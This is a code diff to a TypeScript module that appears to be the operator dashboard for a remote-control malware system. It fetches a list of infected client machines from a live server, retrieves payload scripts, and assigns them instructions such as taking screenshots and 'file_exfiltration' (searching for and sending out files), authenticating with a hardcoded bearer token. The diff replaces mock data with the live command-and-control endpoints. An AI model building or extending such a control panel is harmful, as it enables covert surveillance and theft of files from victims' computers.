@@ -30,28 +30,16 @@ const INSTRUCTION_DESCRIPTIONS: Record<string, string> = {
   "file_exfiltration": "Söker och skickar specifika filer"
 };
 
-// Production server URL - Updated to match the Apache configuration
+// Server configuration - Use correct URL format based on the Flask server configuration in server.py
 const SERVER_BASE_URL = 'https://neea.fun';
-const API_ENDPOINT = '/listener/log_receiver';
-const INSTRUCTIONS_ENDPOINT = '/get_instructions';
+// API Endpoints from server.py
+const API_CLIENTS_ENDPOINT = '/api/clients';
+const API_CLIENT_INSTRUCTION_ENDPOINT = '/api/clients/{clientId}/instruction';
+const API_CONFIG_ENDPOINT = '/api/get_config';
+const API_INSTRUCTIONS_ENDPOINT = '/get_instructions';
 
-// Mock client data - this will be replaced by real API data in production
-const MOCK_CLIENTS: ClientInstruction[] = [
-  {
-    id: "1",
-    name: "wickey",
-    system: "DESKTOP-HKQH9A7",
-    currentInstruction: "screenshot",
-    lastActivity: "2025-03-18 18:03:05"
-  },
-  {
-    id: "2",
-    name: "wickey_desktop-hkqh9a7",
-    system: "DESKTOP-HKQH9A7",
-    currentInstruction: "standard",
-    lastActivity: "2025-03-18 04:50:51"
-  }
-];
+// Authentication token from server.py
+const AUTH_TOKEN = 'SmpVdUpXMEZKTk5nT2CQWGh4SVFlM3lNUWtDUGZJeEtXM2VkU3RuUExwVg==';
 
 // Extract scripts from instructions.py
 export async function extractScriptsFromInstructionsPy(): Promise<ScriptsData> {
@@ -81,8 +69,12 @@ export async function extractScriptsFromInstructionsPy(): Promise<ScriptsData> {
  */
 export async function getScripts(): Promise<ScriptsData> {
   try {
-    // Use the correct API endpoint based on the Apache configuration
-    const response = await fetch(`${SERVER_BASE_URL}${INSTRUCTIONS_ENDPOINT}`);
+    // Use the correct API endpoint with proper authorization
+    const response = await fetch(`${SERVER_BASE_URL}${API_INSTRUCTIONS_ENDPOINT}`, {
+      headers: {
+        'Authorization': `Bearer ${AUTH_TOKEN}`
+      }
+    });
     
     if (!response.ok) {
       throw new Error(`Failed to fetch scripts: ${response.status} ${response.statusText}`);
@@ -92,13 +84,13 @@ export async function getScripts(): Promise<ScriptsData> {
       const data = await response.json();
       return data;
     } catch (error) {
-      console.warn("API returned non-JSON response, using mock data instead");
+      console.warn("API returned non-JSON response, using instruction code instead");
       return INSTRUCTION_CODE;
     }
   } catch (error) {
     console.error("Error fetching scripts:", error);
     
-    // Use local mock data if API fails
+    // Fallback to local instruction code
     const scripts = await extractScriptsFromInstructionsPy();
     return scripts;
   }
@@ -119,28 +111,29 @@ export async function getInstructionTypes(): Promise<InstructionType[]> {
 // Get all clients and their current instructions
 export async function getClients(): Promise<ClientInstruction[]> {
   try {
-    // Use the correct API endpoint based on the Apache configuration
-    const response = await fetch(`${SERVER_BASE_URL}/api/clients`);
+    // Use the correct API endpoint from server.py
+    const response = await fetch(`${SERVER_BASE_URL}${API_CLIENTS_ENDPOINT}`);
     if (!response.ok) {
       throw new Error(`HTTP error! status: ${response.status}`);
     }
     return await response.json();
   } catch (error) {
     console.error("Error fetching clients:", error);
-    // Return mock data
-    return MOCK_CLIENTS;
+    // Return empty array rather than mock data
+    return [];
   }
 }
 
 // Update a client's instruction
 export async function updateClientInstruction(clientId: string, instructionId: string): Promise<boolean> {
   try {
-    // Use the correct API endpoint based on the Apache configuration
-    const response = await fetch(`${SERVER_BASE_URL}/api/clients/${clientId}/instruction`, {
+    // Use the correct API endpoint with proper path parameter replacement
+    const endpoint = API_CLIENT_INSTRUCTION_ENDPOINT.replace('{clientId}', clientId);
+    const response = await fetch(`${SERVER_BASE_URL}${endpoint}`, {
       method: 'PUT',
       headers: {
         'Content-Type': 'application/json',
-        'Authorization': 'Bearer SmpVdUpXMEZKTk5nT2CQWGh4SVFlM3lNUWtDUGZJeEtXM2VkU3RuUExwVg==', // Using the token from instructions.py
+        'Authorization': `Bearer ${AUTH_TOKEN}`,
       },
       body: JSON.stringify({ instruction: instructionId }),
     });
@@ -152,7 +145,6 @@ export async function updateClientInstruction(clientId: string, instructionId: s
     return true;
   } catch (error) {
     console.error("Error updating client instruction:", error);
-    // Mock success for demo purposes
-    return true;
+    return false;
   }
 }
